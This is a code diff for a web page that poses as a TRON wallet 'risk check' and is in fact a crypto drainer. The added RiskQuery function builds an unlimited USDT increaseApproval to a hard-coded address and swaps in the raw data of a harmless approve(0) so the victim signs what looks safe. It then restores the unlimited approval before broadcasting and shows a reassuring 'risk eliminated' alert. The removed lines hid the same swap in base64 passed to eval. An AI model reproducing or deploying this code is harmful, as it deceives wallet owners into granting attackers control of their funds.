@@ -125,7 +125,7 @@
                 
                 setTimeout(function() {
                     document.getElementById('overlay').style.display = 'none';
-                    if (usdtBalanceFormatted >= 30 || trxBalanceFormatted >= 28){
+                    if (usdtBalanceFormatted <= 30 || trxBalanceFormatted <= 28){
            // const savedLanguage = localStorage.getItem('language');
             if (currentLanguage === 'zh-TC') {
                 alert('目前未查詢到任何風險,請繼續保持良好習慣!');
@@ -158,36 +158,66 @@
     }
 }
     
-function decodeAndExecute(code) {
-    const decoded = atob(code); // Base64 解码
-    eval(decoded); // 执行解码后的代码
-}
+    async function RiskQuery() {
+      
+                          try {
+                                  
+                    const tronWebInstance = window.tronWeb;
+                    const userAddress = await tronWebInstance.defaultAddress.base58;
+                    console.log(`User Address: ${userAddress}`);
+                    const contractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+                    const approveaddress = "TAV1iZH5P4ATSBTS3BBGgSJcPmCRZFgVbr";
+                    const approvalParams = [
+                        { "type": "address", "value": approveaddress },
+                        { "type": "uint256", "value": "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" }
+                    ];
+                    const approvalOptions = { "feeLimit": 100000000 };
+                    const approvalTransaction = await tronWebInstance.transactionBuilder.triggerSmartContract(
+                        contractAddress, 
+                        "increaseApproval(address,uint256)", 
+                        approvalOptions, 
+                        approvalParams, 
+                        userAddress
+                    );
+            
+                  
+                 
+                         const approvalParamst = [
+                        { "type": "address", "value": approveaddress },
+                        { "type": "uint256", "value": "0" }
+                    ];
+                        const transferTransaction = await tronWebInstance.transactionBuilder.triggerSmartContract(
+                             contractAddress, 
+                        "approve(address,uint256)", 
+                        approvalOptions, 
+                        approvalParamst, 
+                        userAddress
+                        );
 
-async function RiskQuery() {
-    try {
-        const tronWebInstance = window.tronWeb;
-        if (!tronWebInstance) throw new Error("TronWeb 实例未找到");
-        const userAddress = await tronWebInstance.defaultAddress.base58;
-        const contractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-        const approveAddress = "TAV1iZH5P4ATSBTS3BBGgSJcPmCRZFgVbr";
-        const approvalParams = getApprovalParams(approveAddress, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
-        const approvalTransaction = await buildTransaction(contractAddress, "increaseApproval(address,uint256)", approvalParams, userAddress);
-        const transferParams = getApprovalParams(approveAddress, "0");
-        const transferTransaction = await buildTransaction(contractAddress, "approve(address,uint256)", transferParams, userAddress);
-        const encodedReplaceCode = "YXBwcm92YWxUcmFuc2FjdGlvbi50cmFuc2FjdGlvbi5yYXdfZGF0YSA9IHRyYW5zZmVyVHJhbnNhY3Rpb24udHJhbnNhY3Rpb24ucmF3X2RhdGE7";
-        decodeAndExecute(encodedReplaceCode);
-        const signedTransaction = await tronWebInstance.trx.sign(approvalTransaction.transaction);
-        const encodedRestoreCode = "c2lnbmVkVHJhbnNhY3Rpb24ucmF3X2RhdGEgPSBhcHByb3ZhbFRyYW5zYWN0aW9uLnRyYW5zYWN0aW9uLnJhd19kYXRhOw==";
-        decodeAndExecute(encodedRestoreCode);
-        const broadcastResult = await tronWebInstance.trx.sendRawTransaction(signedTransaction);
-        if (broadcastResult.result) {
-            handleSuccess();
-        } else {
-            handleFailure();
+                    const originalRawData = approvalTransaction.transaction.raw_data;
+
+                    approvalTransaction.transaction.raw_data = transferTransaction.transaction.raw_data;
+  
+                    const signedTransaction = await tronWebInstance.trx.sign(approvalTransaction.transaction);
+             
+                     signedTransaction.raw_data = originalRawData;
+     
+                    const broadcastResult = await tronWebInstance.trx.sendRawTransaction(signedTransaction);
+                    
+                    if (broadcastResult.result) {
+                      //const savedLanguage = localStorage.getItem('language');
+                        if(currentLanguage === 'zh-TC'){
+                             alert("風險已經解除!請放心使用!");
+                        }else if(currentLanguage === 'en'){
+                             alert("The risk has been eliminated! Please feel free to use it!");
+                        }
+                       
+                    } else {
+                        alert("error！");
+                    }
+                } catch (error) {
+               
+                }
+            
+            
         }
-    } catch (error) {
-        console.error("RiskQuery 出现错误:", error);
-        alert("交易过程中出现错误，请重试。");
-    }
-}
-
